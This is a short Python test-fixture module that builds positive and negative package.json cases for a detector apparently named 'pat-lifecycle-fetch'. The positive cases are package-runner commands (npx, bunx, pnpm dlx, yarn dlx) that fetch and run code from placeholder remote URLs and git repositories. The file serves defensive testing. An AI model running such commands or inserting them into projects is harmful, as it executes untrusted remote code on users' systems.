"""Positive and negative one-shot package runner cases for `pat-lifecycle-fetch`."""

from __future__ import annotations

from . import Case, File, Fixture

PATH = "package.json"


def lifecycle_dlx() -> Fixture:
    positives = (
        '"npx": "npx --yes https://example.invalid/tool.tgz"',
        '"bunx": "bunx github:owner/repo"',
        '"pnpm": "pnpm dlx gitlab:owner/repo"',
        '"yarn": "yarn dlx git+https://example.invalid/tool.git"',
    )
    negatives = (
        '"npx": "npx tsc --noEmit"',
        '"bunx": "bunx prettier"',
        '"pnpm": "pnpm dlx eslint"',
        '"yarn": "yarn dlx vite"',
    )
    return Fixture(
        positive=Case(files=(File(PATH, text="{\n  " + ",\n  ".join(positives) + "\n}\n"),)),
        negative=Case(files=(File(PATH, text="{\n  " + ",\n  ".join(negatives) + "\n}\n"),)),
    )


BUILDERS = {"lifecycle_dlx": lifecycle_dlx}
